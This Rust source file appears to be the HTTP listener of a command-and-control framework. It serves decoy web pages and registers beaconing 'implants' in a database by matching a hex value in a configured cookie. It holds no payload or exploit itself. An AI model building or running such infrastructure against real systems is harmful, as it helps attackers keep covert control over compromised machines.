extern crate regex;

use lazy_static::lazy_static;
use std::fs;
use std::path::Path;
use std::string::FromUtf8Error;
use std::sync::mpsc::Receiver;
use std::sync::mpsc::TryRecvError;
use std::thread;
use std::time;
use regex::bytes::{Captures, Match};
use std::io;
use std::io::prelude::*;
use std::net::TcpListener;
use std::net::TcpStream;
use regex::bytes::Regex;

use crate::models::ListenerSignal;
use crate::models::ListenerState;
use crate::settings;
use crate::database;

lazy_static!
{
    static ref CONFIG: settings::Settings =
        settings::Settings::new().unwrap();
}

fn handle_connection(mut stream: TcpStream, listener_id: u16)
{
    // Read the first 1024 bytes of data from the stream
    let mut buffer: [u8; 1024] = [0; 1024];
    stream.read(&mut buffer).unwrap();

    let get: &[u8; 6] = b"GET / ";
    let http_cookie = &CONFIG.listener.http.cookie_name;
    
    // Respond with greetings or a 404,
    // depending on the data in the request
    let (http_response_headers, response_body_page_path) = if buffer.starts_with(get)
    {
        ("HTTP/1.1 200 OK\r\n\r\n", &CONFIG.listener.http.default_page_path)
    } else {
        ("HTTP/1.1 404 Not Found\r\n\r\n", &CONFIG.listener.http.default_error_page_path)
    };

    let http_response_body = if Path::new(response_body_page_path).exists()
    {
        match fs::read(response_body_page_path)
        {
            Ok(v) => v,
            Err(_) => vec![]
        }
    }
    else {
        vec![]
    };

    let regex_string = format!("Cookie: {}=([a-f0-9A-F]*)", http_cookie);
    let re = Regex::new(regex_string.as_str()).unwrap();
    let caps: Option<Captures> = re.captures(&buffer);

    if caps.is_some()
    {
        let capture_match: Option<Match> = caps.unwrap().get(1);
        if capture_match.is_some()
        {
            let cookie_indexes: Match = capture_match.unwrap();
            let cookie: Vec<u8> = buffer[cookie_indexes.start()..cookie_indexes.end()].to_vec();
            let cookie_str: Result<String, FromUtf8Error> = String::from_utf8(cookie);

            if cookie_str.is_ok()
            {
                let implant_cookie_hash: String = cookie_str.unwrap();

                if ! database::check_if_implant_in_db(&implant_cookie_hash)
                {
                    println!("[+] Adding to database implant with hash: {}\n", implant_cookie_hash);

                    if database::add_implant(listener_id, &implant_cookie_hash)
                    {
                        println!("[+] Implant successfully added to the database");
                    }
                    else
                    {
                        println!("[!] Failed to add the implant to the database");
                    }
                }
            }
        }
    }

    // Write response back to the stream,
    // and flush the stream to ensure the response is sent back to the client
    stream.write_all(http_response_headers.as_bytes()).unwrap();
    stream.write_all(&http_response_body).unwrap();
    stream.flush().unwrap();
}

pub fn start_listener(listener_id: u16, rx: Receiver<ListenerSignal>)
{
    let address: String;
    let port: u16;

    address = crate::database::get_listener_address(listener_id);
    port = crate::database::get_listener_port(listener_id);

    let bind_address: String = String::from(&format!(
        "{}:{}",
        address, port
    ));

    let bind_result: Result<TcpListener, io::Error> = TcpListener::bind(bind_address);
    if bind_result.is_err()
    {
        println!("\n[!] Couldn't bind the listener to the specified address");
        println!("[!] Is it already in use?");
        return;
    }
    else
    {

        if crate::database::set_listener_state(listener_id, ListenerState::Active){
            println!("\n[+] Set listener as active");
        }
        else
        {
            println!("\n[!] Error while setting the listener as active");
            return;
        }

        let listener: TcpListener = bind_result.unwrap();
        listener.set_nonblocking(true).expect("Cannot set non-blocking");

        for stream in listener.incoming()
        {
            match stream {
                Ok(s) =>
                {
                    // handle the incoming connection
                    handle_connection(s, listener_id);
                }
                Err(ref e) if e.kind() == io::ErrorKind::WouldBlock =>
                {
                    thread::sleep(time::Duration::from_secs(1));

                    let msg_result = rx.try_recv();
                    match msg_result
                    {
                        Ok(b) => {
                            match b
                            {
                                ListenerSignal::StopListener => return
                            }
                        },
                        Err(TryRecvError::Disconnected) => return,
                        Err(TryRecvError::Empty) => continue
                    }
                }
                Err(e) => panic!("encountered IO error: {}", e),
            }
        }
    }
}
